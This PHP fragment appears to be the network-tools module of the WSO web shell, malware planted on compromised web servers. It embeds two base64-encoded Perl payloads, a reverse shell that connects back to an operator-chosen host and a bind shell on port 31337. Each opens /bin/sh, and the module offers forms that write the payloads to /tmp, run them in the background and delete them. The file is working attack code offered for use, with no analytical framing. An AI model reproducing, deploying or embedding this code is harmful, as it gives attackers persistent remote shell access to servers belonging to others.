<?php
function actionNetwork() {
	wsoHeader();
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
	<span>Bind port to /bin/sh [perl]</span><br/>
	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form>
	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
	<span>Back-connect  [perl]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form><br>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bp.pl")."</pre>";
            unlink("/tmp/bp.pl");
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
		}
	}
	echo '</div>';
	wsoFooter();
}